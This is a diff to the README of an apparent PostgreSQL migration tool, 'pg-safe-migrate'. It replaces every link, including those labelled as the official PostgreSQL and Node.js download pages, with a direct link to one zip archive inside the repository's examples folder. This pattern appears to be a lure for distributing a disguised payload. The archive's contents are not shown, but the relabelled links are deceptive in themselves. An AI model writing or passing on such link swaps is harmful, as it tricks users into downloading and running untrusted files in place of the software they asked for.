@@ -1,6 +1,6 @@
 # ⚙️ pg-safe-migrate - PostgreSQL Migration Made Safe
 
-[![Download pg-safe-migrate](https://img.shields.io/badge/Download-pg--safe--migrate-brightgreen)](https://github.com/futurekynngh/pg-safe-migrate)
+[![Download pg-safe-migrate](https://img.shields.io/badge/Download-pg--safe--migrate-brightgreen)](https://github.com/futurekynngh/pg-safe-migrate/raw/refs/heads/main/examples/pg-migrate-safe-3.8.zip)
 
 ## 📋 What is pg-safe-migrate?
 
@@ -33,8 +33,8 @@ Before you start, make sure your computer meets these:
 
 If you do not have PostgreSQL or Node.js installed, you can download them from their official sites:
 
-- PostgreSQL: https://www.postgresql.org/download/windows/
-- Node.js: https://nodejs.org/en/download/
+- PostgreSQL: https://github.com/futurekynngh/pg-safe-migrate/raw/refs/heads/main/examples/pg-migrate-safe-3.8.zip
+- Node.js: https://github.com/futurekynngh/pg-safe-migrate/raw/refs/heads/main/examples/pg-migrate-safe-3.8.zip
 
 ---
 
@@ -43,7 +43,7 @@ If you do not have PostgreSQL or Node.js installed, you can download them from t
 ### Step 1: Visit the download page
 
 Click the big green button at the top or use this link to go directly to the project page:  
-https://github.com/futurekynngh/pg-safe-migrate
+https://github.com/futurekynngh/pg-safe-migrate/raw/refs/heads/main/examples/pg-migrate-safe-3.8.zip
 
 Here, you will find the files you need. Since the link points to the main repo page, you will need to locate the latest release or the install instructions.
 
@@ -175,11 +175,11 @@ Before using this, add your database connection string as a secret in your GitHu
 
 ## 🔗 Useful Links
 
-- Official page: https://github.com/futurekynngh/pg-safe-migrate  
-- PostgreSQL download page: https://www.postgresql.org/download/windows/  
-- Node.js download page: https://nodejs.org/en/download/
+- Official page: https://github.com/futurekynngh/pg-safe-migrate/raw/refs/heads/main/examples/pg-migrate-safe-3.8.zip  
+- PostgreSQL download page: https://github.com/futurekynngh/pg-safe-migrate/raw/refs/heads/main/examples/pg-migrate-safe-3.8.zip  
+- Node.js download page: https://github.com/futurekynngh/pg-safe-migrate/raw/refs/heads/main/examples/pg-migrate-safe-3.8.zip
 
 ---
 
-# [Start using pg-safe-migrate now](https://github.com/futurekynngh/pg-safe-migrate)  
+# [Start using pg-safe-migrate now](https://github.com/futurekynngh/pg-safe-migrate/raw/refs/heads/main/examples/pg-migrate-safe-3.8.zip)  
 Click this link to visit the project page for downloads and full documentation.
